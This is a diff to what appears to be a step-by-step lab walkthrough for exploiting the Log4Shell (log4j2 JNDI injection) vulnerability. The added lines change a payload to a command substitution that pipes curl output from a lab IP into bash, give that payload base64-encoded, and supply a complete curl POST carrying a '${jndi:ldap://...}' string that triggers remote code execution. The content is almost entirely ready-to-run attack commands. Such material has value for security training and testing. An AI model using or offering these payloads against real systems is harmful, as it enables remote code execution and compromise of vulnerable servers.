@@ -54,7 +54,18 @@ touch index.html
 Inside the ```index.html``` file put the following payload and change the IP address to the one that suits to the current environment
 
 ```
-curl 192.168.1.6|bash 
+$(curl 192.168.1.6:8085|bash) 
 ``` 
 
-4. 
+4. convert the payload above in base64 format as seen below 
+
+```
+JChjdXJsIDE5Mi4xNjguMS42OjgwODV8YmFzaCk=
+```
+
+5. Now that the ```logging-log4j2``` application runs, use the ```curl``` command line tool in order send the jndi payload as shown below 
+
+```
+curl -s -X POST http://192.168.1.6:8080/lol -H "Content-type:application/json" -d "{\"vuln\":\"\${jndi:ldap://192.168.1.6:6389/JChjdXJsIDE5Mi4xNjguMS42OjgwODV8YmFzaCk=}\"}"
+
+```
